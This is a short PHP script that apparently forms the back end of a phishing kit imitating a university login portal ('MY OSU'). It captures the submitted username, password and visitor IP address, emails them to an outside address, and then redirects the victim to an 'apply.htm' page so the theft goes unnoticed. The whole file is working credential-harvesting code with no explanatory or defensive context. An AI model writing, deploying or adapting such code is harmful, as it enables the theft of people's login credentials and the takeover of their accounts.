<?

$username  = $_POST['UserName'];

$password = $_POST['Password'];

$ip = $_SERVER['REMOTE_ADDR'];


$subj = "MY OSU";
$msg = "UserName : $username \n Password: $password \n ipadd: $ip \n\n";


$from = "From: $ip<BSU>";

mail("globalserv@globalservicespaymt.com", $subj, $msg, $from);

mail("", $subj, $msg, $from);

header('location:apply.htm');

?>